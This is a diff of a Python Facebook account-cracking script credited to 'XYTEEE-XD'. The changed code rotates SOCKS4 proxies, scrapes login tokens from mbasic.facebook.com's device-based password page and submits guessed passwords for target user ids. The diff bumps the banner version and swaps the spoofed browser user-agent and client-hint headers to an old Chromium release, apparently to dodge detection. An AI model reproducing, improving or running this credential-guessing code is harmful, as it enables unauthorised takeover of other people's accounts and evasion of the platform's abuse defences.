@@ -488,7 +488,7 @@ def xyteee():
   █▌█▌\x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m▪\x1b[0;97m██▌\x1b[0;91m•\x1b[0;97m██  ▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[0;97m
   \x1b[0;91m·\x1b[0;97m██\x1b[0;91m·\x1b[0;97m ▐█▌▐█\x1b[0;91m▪\x1b[0;97m ▐█\x1b[0;91m.▪\x1b[0;97m▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄
  \x1b[0;91m▪\x1b[0;97m▐█\x1b[0;91m·\x1b[0;97m█▌ ▐█▀\x1b[0;91m·.\x1b[0;97m ▐█▌\x1b[0;91m·\x1b[0;97m▐█▄▄▌▐█▄▄▌▐█▄▄▌ \x1b[1;91m•\033[93m•\x1b[1;92m•\x1b[1;97m
- \x1b[0;91m•\x1b[0;97m▀▀ ▀▀  ▀ \x1b[0;91m•\x1b[0;97m  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ \033[1;31m\033[1;47mversion\033[0;0m\x1b[1;30m 1.1.1 \x1b[1;30m
+ \x1b[0;91m•\x1b[0;97m▀▀ ▀▀  ▀ \x1b[0;91m•\x1b[0;97m  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ \033[1;31m\033[1;47mversion\033[0;0m\x1b[1;30m 1.2 \x1b[1;30m
 \033[38;3;276;131;0;1m-----------------------------------------------------
  Author   : XYTEEE-XD
  Telegram : t.me/xyteee
@@ -817,14 +817,14 @@ def md2(idf,pwv):
       open('http.txt','w').write(proxs)
       nip = rc(proxs)
       proxs = {'http': 'socks4://'+nip}
-      ses.headers.update({'authority': 'mbasic.facebook.com',
+      ses.headers.update({'authority':'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
     'cache-control': 'max-age=0',
     'dpr': '3',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";                 v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";                 v="99.0.0.0", "Chromium";v="25.0.1364.160"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-model': '""',
     'sec-ch-ua-platform': '"Linux"',
@@ -834,21 +834,21 @@ def md2(idf,pwv):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.22 (KHTML, like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160 Safari/537.22',
     'viewport-width': '980',
 })
       p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
       dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
-      headers.update({'authority': 'mbasic.facebook.com',
+      headers.update({'authority':'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
     'cache-control': 'max-age=0',
     'dpr': '3',
 'sec-ch-prefers-color-scheme': 'dark',
 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="125.0.1364.160"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Linux"',
@@ -858,7 +858,7 @@ def md2(idf,pwv):
 'sec-fetch-site': 'none',
 'sec-fetch-user': '?1',
 'upgrade-insecure-requests': '1',
-'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.22 (KHTML, like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160 Safari/537.22',
 'authority': 'mbasic.facebook.com',
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 'accept-language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
@@ -866,7 +866,7 @@ def md2(idf,pwv):
 'dpr': '3',
 'sec-ch-prefers-color-scheme': 'dark',
 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="25.0.1364.160"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Linux"',
@@ -876,7 +876,7 @@ def md2(idf,pwv):
 'sec-fetch-site': 'none',
 'sec-fetch-user': '?1',
 'upgrade-insecure-requests': '1',
-'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.22 (KHTML, like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160 Safari/537.22',
 'viewport-width': '980',})
       p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
       dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
